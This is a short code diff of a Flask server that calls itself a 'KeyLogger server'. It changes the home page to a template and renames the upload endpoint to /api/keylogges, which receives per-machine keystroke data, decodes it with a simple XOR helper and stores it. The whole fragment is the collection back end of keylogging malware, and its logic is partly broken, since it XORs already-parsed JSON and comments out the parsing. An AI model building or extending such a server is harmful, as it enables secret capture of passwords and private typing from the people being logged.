@@ -1,4 +1,4 @@
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, render_template
 import os, time, json
 from datetime import datetime
 app = Flask(__name__)
@@ -23,14 +23,14 @@ os.makedirs(DATA_FOLDER, exist_ok=True)
 
 @app.route('/')
 def home():
-    return 'KeyLogger server is running'
+    return render_template('Main_page.html')
 
-@app.route('/api/upload', methods=['POST'])
+@app.route('/api/keylogges', methods=['POST'])
 def upload():
     # קבלת JSON
     encrypted_data = request.get_json(silent=True)
     data = Encryptor.encryption_using_xor(encrypted_data, 4)
-    data = json.loads(encrypted_data)
+    #data = json.loads(encrypted_data)
     if not data or "machine" not in data or "data" not in data:
         return jsonify({"error": "Invalid data"}), 400
     
